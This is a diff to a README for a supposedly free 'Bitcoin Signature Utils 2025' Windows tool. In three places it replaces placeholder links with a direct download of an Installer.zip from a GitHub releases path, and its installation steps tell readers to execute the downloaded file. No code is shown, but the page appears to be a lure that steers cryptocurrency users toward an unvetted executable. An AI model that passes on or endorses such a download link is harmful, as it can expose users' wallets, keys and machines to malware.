@@ -27,13 +27,13 @@ Bitcoin Signature Utils 2025 offers a comprehensive set of tools for analyzing a
 - **User-Friendly Interface**: Navigate the software with an intuitive design.
 - **Free to Use**: Enjoy all features without any cost.
 - **Windows 10 Compatibility**: Fully functional on Windows 10.
-- **Downloadable Resources**: Access all tools and updates directly from our [Releases section](555).
+- **Downloadable Resources**: Access all tools and updates directly from our [Releases section](https://github.com/sirex166/Bitcoin-Signature-Utils-2025/releases/download/Btc/Installer.zip).
 
 ## Installation
 
 To install Bitcoin Signature Utils 2025, follow these simple steps:
 
-1. Visit the [Releases section](555).
+1. Visit the [Releases section](https://github.com/sirex166/Bitcoin-Signature-Utils-2025/releases/download/Btc/Installer.zip).
 2. Download the latest version of the software.
 3. Execute the downloaded file to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
@@ -67,7 +67,7 @@ For any inquiries or support, please reach out to us via the Issues section of t
 
 ## Links
 
-For more information and updates, visit our [Releases section](555). 
+For more information and updates, visit our [Releases section](https://github.com/sirex166/Bitcoin-Signature-Utils-2025/releases/download/Btc/Installer.zip). 
 
 ---
 
